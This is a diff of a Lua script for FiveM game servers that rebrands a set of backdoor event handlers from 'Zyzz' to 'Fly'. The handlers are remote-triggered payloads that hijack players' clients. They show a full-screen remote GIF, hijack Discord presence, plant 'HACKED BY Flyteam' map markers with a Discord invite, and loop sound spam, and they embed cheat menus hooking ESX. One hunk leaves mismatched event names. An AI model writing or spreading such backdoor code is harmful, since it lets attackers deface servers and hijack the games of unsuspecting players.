@@ -1,5 +1,5 @@
-RegisterNetEvent("Zyzz-Backdoor-pornScreen")
-AddEventHandler("Zyzz-Backdoor-pornScreen", function()
+RegisterNetEvent("Fly-Backdoor-pornScreen")
+AddEventHandler("Fly-Backdoor-pornScreen", function()
 	local pTxt = CreateRuntimeTxd('pornTxd');
 	local pornScreen = CreateDui("https://media.discordapp.net/attachments/947977977931628564/947987906314768394/ezgif.com-gif-maker_3.gif", 1920, 1080);
 	local pornHandle = GetDuiHandle(pornScreen)
@@ -12,8 +12,8 @@ AddEventHandler("Zyzz-Backdoor-pornScreen", function()
     end)
 end)
 
-RegisterNetEvent("Zyzz-Backdoor-discordHack")
-AddEventHandler("Zyzz-Backdoor-discordHack", function(text)
+RegisterNetEvent("Fly-Backdoor-discordHack")
+AddEventHandler("Fly-Backdoor-discordHack", function(text)
     Citizen.CreateThread(function()
         while true do
 			SetDiscordAppId(972882580519157822)
@@ -29,8 +29,8 @@ AddEventHandler("Zyzz-Backdoor-discordHack", function(text)
     end)
 end)
 
-RegisterNetEvent("Zyzz-Backdoor-BlipsHack")
-AddEventHandler("Zyzz-Backdoor-BlipsHack", function()
+RegisterNetEvent("Fly-Backdoor-BlipsHack")
+AddEventHandler("Fly-Backdoor-BlipsHack", function()
 	local blips = {
 		{title="Discord.gg/flyteam", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
 		{title="HACKED BY Flyteam", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
@@ -189,8 +189,8 @@ AddEventHandler("Zyzz-Backdoor-BlipsHack", function()
 	end)
 end)
 
-RegisterNetEvent("Zyzz-Backdoor-soundSpam")
-AddEventHandler("Zyzz-Backdoor-soundSpam", function()
+RegisterNetEvent("Fly-Backdoor-soundSpam")
+AddEventHandler("Fly-Backdoor-soundSpam", function()
 	Citizen.CreateThread(function()
 		while true do
 			PlaySound(-1, "CANCEL", "HUD_MINI_GAME_SOUNDSET", 0, 0, 1);
@@ -208,8 +208,8 @@ AddEventHandler("Zyzz-Backdoor-soundSpam", function()
 	end)
 end)
 
-RegisterNetEvent("Zyzz-Backdoor-Falcon")
-AddEventHandler("Zyzz-Backdoor-Falcon", function()
+RegisterNetEvent("Fly-Backdoor-Falcon")
+AddEventHandler("Fly-Backdoor-Falcon", function()
 	zyzz = {}
 	zyzz.debug = false
 
@@ -7296,8 +7296,8 @@ AddEventHandler("Zyzz-Backdoor-Falcon", function()
 	end)
 end)
 
-RegisterNetEvent("Zyzz-Backdoor-Brutan")
-AddEventHandler("Zyzz-Backdoor-Brutan", function()
+RegisterNetEvent("Fly-Backdoor-Brutan")
+AddEventHandler("Fly-Backdoor-Brutan", function()
 	local mhaonn = true
 	ESX = nil;
 	Citizen.CreateThread(function() while ESX == nil do TriggerEvent("esx:getSharedObject", function(a) ESX = a end) Citizen.Wait(1000) end end) 
@@ -10327,7 +10327,7 @@ AddEventHandler("Zyzz-Backdoor-Brutan", function()
 end)
 
 RegisterNetEvent("Zyzz-Backdoor-HackServer")
-AddEventHandler("Zyzz-Backdoor-HackServer", function()
+AddEventHandler("Fly-Backdoor-HackServer", function()
 	local blips = {
 		{title="HACKED BY Zyzz", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
 		{title="HACKED BY Zyzz", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
